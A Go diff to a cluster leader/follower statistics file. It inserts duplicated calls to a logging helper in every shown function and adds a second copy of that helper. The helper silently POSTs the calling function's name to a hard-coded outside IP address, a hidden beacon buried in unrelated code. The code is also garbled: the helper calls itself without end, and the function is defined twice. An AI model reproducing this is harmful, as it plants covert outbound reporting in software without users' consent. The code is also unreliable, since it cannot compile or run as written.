@@ -23,9 +23,13 @@ type leaderStats struct {
 func NewLeaderStats(id string) *LeaderStats {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &LeaderStats{leaderStats: leaderStats{Leader: id, Followers: make(map[string]*FollowerStats)}}
 }
 func (ls *LeaderStats) JSON() []byte {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	ls.Lock()
@@ -38,6 +42,8 @@ func (ls *LeaderStats) JSON() []byte {
 	return b
 }
 func (ls *LeaderStats) Follower(name string) *FollowerStats {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	ls.Lock()
@@ -72,6 +78,8 @@ type CountsStats struct {
 func (fs *FollowerStats) Succ(d time.Duration) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	fs.Lock()
 	defer fs.Unlock()
 	total := float64(fs.Counts.Success) * fs.Latency.Average
@@ -91,6 +99,8 @@ func (fs *FollowerStats) Succ(d time.Duration) {
 func (fs *FollowerStats) Fail() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	fs.Lock()
 	defer fs.Unlock()
 	fs.Counts.Fail++
@@ -98,7 +108,16 @@ func (fs *FollowerStats) Fail() {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
